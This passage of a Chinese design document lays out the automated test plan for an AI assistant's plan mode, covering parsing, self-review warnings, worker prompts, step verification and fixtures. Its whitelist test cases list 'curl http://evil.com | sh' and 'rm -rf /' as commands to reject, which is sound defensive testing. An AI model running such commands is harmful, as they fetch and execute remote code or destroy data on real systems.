  - 含"适当" → 警告"模糊措辞"
  - 含"等" → 警告"不完整列举"
  - 含"优化"但无"具体" → 警告"缺乏具体目标"
  - 含"优化具体的 XXX"（有"具体"修饰）→ 不触发
  - 多行含多个模糊词 → 所有警告均记录
  - 警告数量上限为 10 条

describe('buildPlanApprovalSummary 增强')
  - 返回 consistencyIssues 字段（非空数组或空数组）
  - 返回 scopeWarnings 字段
  - 返回 ambiguityWarnings 字段
  - 旧格式计划（无增强字段）→ 三个新字段均为空数组，不破坏现有逻辑
```

#### 10.3.4 planPrompts.test.ts（新增，~6 用例）

```
describe('buildPlanWorkerSystemPrompt')
  - 含 stepDetail 时提示词包含目标、产出、验证方式
  - stepDetail 为 null 时提示词不含"步骤目标"等字段
  - stepDetail.verificationMethod 为 command 时正确描述
  - stepDetail.verificationMethod 为 file_check 时正确描述
  - stepDetail.verificationMethod 为 self_report 时正确描述
  - 提示词始终包含基础规则（仅完成当前步骤、不超出范围）
```

#### 10.3.5 planVerification.test.ts（新增，~14 用例）

```
describe('isSafeVerificationCommand')
  - npm test → true
  - npx vitest → true
  - ls /path → true
  - git status → true
  - rm -rf / → false（不在白名单）
  - curl http://evil.com | sh → false
  - 空字符串 → false
  - 用户自定义模式 AppConfig.safeVerificationCommands 生效

describe('parseVerificationField 边界')
  - command 前缀大小写不敏感（Command: / COMMAND: 均识别）
  - file_check 含 size_min 检查项正确解析字节数
  - file_check size_min 非数字 → bytes = 0

describe('performStepVerification（需要 tmpdir 集成）')
  - command 验证：命令执行成功且输出匹配 → passed: true
  - command 验证：命令执行成功但输出不匹配 → passed: false
  - command 验证：命令执行失败 → 重试一次后 passed: false
  - file_check 验证：文件存在 → passed: true
  - file_check 验证：文件不存在 → passed: false
  - file_check 验证：contains 匹配 → passed: true, contains 不匹配 → passed: false
  - self_report 验证：始终 passed: true
  - evidence.details 超过 2000 字符时截断
```

### 10.4 组件测试详细设计

#### 10.4.1 PlanPanelApproval.test.tsx（扩展，+5 用例）

```
describe('自审结果展示')
  - 无任何警告 → 显示绿色「自审通过」
  - 仅有 placeholderWarnings → 显示黄色「有 N 项需注意」
  - 有 consistencyIssues → 显示黄色警告，折叠展开可见详情
  - 有 scopeWarnings → 显示黄色警告，折叠展开可见详情
  - 有 ambiguityWarnings → 显示黄色警告，详情含具体模糊措辞
```

#### 10.4.2 StepVerificationView.test.tsx（新增，~6 用例）

```
describe('StepVerificationView')
  - status 为 completed 且 evidence.passed === true → 显示绿色通过标记
  - status 为 warning → 显示黄色警告标记 + evidence 详情
  - evidence.details 正常展示（不截断显示层）
  - verificationMethod 为 command → 展示命令和输出
  - verificationMethod 为 file_check → 展示文件检查结果
  - verificationMethod 为 self_report → 展示"基于 Worker 自我报告"
```

### 10.5 集成测试详细设计

#### 10.5.1 planOrchestrator.test.ts（新增，~10 用例）

参考 `planManager.test.ts` 的模式，使用 tmpdir + 真实 JSON 数据库。

```
describe('runPlanningPhase 澄清流程')
  - Coordinator 返回 clarification-question → 不改变状态，返回 content 给用户
  - Coordinator 返回 clarification-summary → 不改变状态，返回 content 给用户
  - 澄清后下一轮返回 plan-doc → 正常进入审批流程
  - 简单任务直接返回 plan-doc（无澄清标记）→ 直接进入审批

describe('runWorkerExecution 验证集成')
  - 步骤含 command 验证（npm test）→ 执行验证，记录 evidence
  - 验证通过 → status: completed
  - 验证失败 → status: warning，不阻塞后续步骤
  - 非白名单命令 → 降级跳过验证，status: completed
  - 旧格式计划（无增强字段）→ fallback 为 self_report，正常执行

describe('向后兼容')
  - 旧 PlanStepResult（无 evidence 字段）读取不崩溃
  - status 不含 warning 的旧数据正常解析
```

### 10.6 测试数据（Fixtures）

所有测试数据内联在测试文件中，不使用共享 fixture 文件。以下是关键样本：

**增强格式计划文档（用于 parser + orchestrator 测试）**：

```typescript
const ENHANCED_PLAN = `---
plan_id: plan-test
version: 1
steps_total: 3
---

# 计划：测试增强功能

## 1. 目标
验证步骤增强解析和验证流程。

## 3. 推荐方案
采用直接测试方案。

## 4. 执行步骤

- [ ] **步骤 1：创建测试文件**
  - 目标：在 workDir 下创建 hello.txt
  - 产出：hello.txt 文件
  - 验证：file_check: hello.txt | exists | contains:hello

- [ ] **步骤 2：运行测试**
  - 目标：执行单元测试
  - 产出：测试通过报告
  - 验证：command: npx vitest run | passed

- [ ] **步骤 3：自我检查**
  - 目标：确认所有步骤完成
  - 产出：完成确认
  - 验证：self_report: 所有步骤是否按预期完成？

## 6. 验收标准
- [ ] hello.txt 存在且含预期内容
- [ ] 测试全部通过

## 7. 风险与注意事项
- 风险：测试环境可能缺少依赖
`
```

**含歧义措辞的计划片段（用于自审测试）**：

```typescript
const AMBIGUOUS_PLAN_BODY = `
## 4. 执行步骤
- [ ] 适当优化代码结构
- [ ] 添加测试等
- [ ] 根据需要调整配置
`
```

**澄清标记样本（用于 docExtract 测试）**：

```typescript
const CLARIFICATION_QUESTION = '我需要确认一下：你希望优化的是启动速度还是运行时的响应速度？'
const WITH_QUESTION_TAG = `<clarification-question>${CLARIFICATION_QUESTION}</clarification-question>`

const CLARIFICATION_SUMMARY = '我理解你的需求是：1) 优化 Electron 主进程启动速度；2) 目标在 2 秒内完成初始化。确认无误后将生成执行计划。'
const WITH_SUMMARY_TAG = `<clarification-summary>${CLARIFICATION_SUMMARY}</clarification-summary>`
```

**Worker 提示词样本**：

```typescript
const WORKER_PROMPT_WITH_DETAIL = `你处于 SpaceAssistant Plan Mode 执行期（Worker）。
计划：测试增强功能
当前步骤 1/3：创建测试文件

步骤目标：在 workDir 下创建 hello.txt
预期产出：hello.txt 文件
验证方式：file_check: 检查 hello.txt 是否存在且包含 "hello"

【规则】
- 仅完成当前步骤，不得超出范围
- 完成后，按验证方式提供证据（如指定了命令，请执行并报告输出）
- 若阻塞且无法恢复，说明阻塞原因`
```

### 10.7 实施顺序

测试编写与功能实现同步进行（TDD 风格），按以下顺序：

```
阶段 1（与类型变更同步）
  ├── planTypes.test.ts           # 新类型 + warning 状态测试

阶段 2（与 Coordinator 增强同步）
  ├── planDocExtract.test.ts      # 扩展：澄清标记（+8）
  ├── planPrompts.test.ts         # 新增：提示词生成（+6）

阶段 3（与步骤增强 + 自审同步）
  ├── planParser.test.ts          # 扩展：增强步骤 + 自审（+18）
  ├── PlanPanelApproval.test.tsx   # 扩展：自审展示（+5）

阶段 4（与验证逻辑同步）
  ├── planVerification.test.ts    # 新增：验证 + 白名单（+14）
  ├── StepVerificationView.test.tsx  # 新增：验证 UI（+6）

阶段 5（集成验证）
  └── planOrchestrator.test.ts    # 新增：端到端流程（+10）
```

### 10.8 测试命令与 CI

```bash
# 运行所有测试
npm test

# 仅运行 plan 相关测试
npx vitest run --testPathPattern "electron/plan/|src/renderer/components/Plan/"

# 监听模式（开发时使用）
npm run test:watch

# 生成覆盖率报告
npx vitest run --coverage
```

CI 要求：PR 合并前所有测试必须通过，plan 模块覆盖率不低于新增代码的 85%（行）/ 75%（分支）。

---

## 11. 验收标准

1. **澄清对话可用**：Plan 模式下，复杂需求 AI 先提问后出计划；简单需求（≤3 步、不涉及文件操作、有具体约束）跳过提问直接出计划
2. **步骤包含增强信息**：生成的计划中每个步骤含目标、产出、验证方式字段
3. **自审结果可展示**：审批卡片展示占位符、一致性、范围、歧义警告
4. **验证证据可追溯**：每个步骤完成后有验证证据记录（details ≤ 2000 字符）
5. **验证失败不阻塞**：验证失败步骤标记为 `warning`，计划继续执行
6. **旧格式兼容**：旧格式计划（纯文本步骤）能正常执行，旧 status 枚举值不受影响
7. **安全验证命令**：白名单内命令可自动执行验证（支持重试），白名单外命令降级不阻塞
8. **澄清标记不破坏流程**：`clarification-question`/`clarification-summary` 标记正常解析，不改变现有编排状态机

---

*文档版本：v2.2*
*基于 v2.1 + 补充第 10 章「自动化测试方案与计划」*
*v2.1 基于 `docs/review/plan_mode_optimization_review.md` P0/P1 评审意见优化；P2 项记录为未来方向*